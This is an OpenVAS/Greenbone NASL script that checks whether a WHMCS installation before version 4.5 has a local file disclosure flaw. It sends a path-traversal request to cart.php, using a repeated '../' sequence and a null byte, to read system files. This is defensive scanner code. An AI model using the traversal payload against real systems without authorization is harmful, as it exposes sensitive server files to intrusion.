# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:whmcs:whmcompletesolution";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103305");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2011-10-20 15:15:44 +0200 (Thu, 20 Oct 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("WHMCS < 4.5 Information Disclosure Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_whmcs_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("whmcs/http_detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"WHMCS is prone to a local file disclosure vulnerability
  because it fails to adequately validate user-supplied input.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"Exploiting this vulnerability would allow an attacker to obtain
  potentially sensitive information from local files on computers running the vulnerable
  application.");

  script_tag(name:"affected", value:"WHMCS prior to version 4.5.");

  script_tag(name:"solution", value:"Update to version 4.5 or later.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50280");
  script_xref(name:"URL", value:"http://forum.whmcs.com/showthread.php?t=42121");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

foreach file (keys(files)) {
  url = dir + "/cart.php?a=test&templatefile=" + crap(data: "../", length: 9 * 3) + files[file] + "%00";

  if (http_vuln_check(port: port, url: url, pattern: file)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
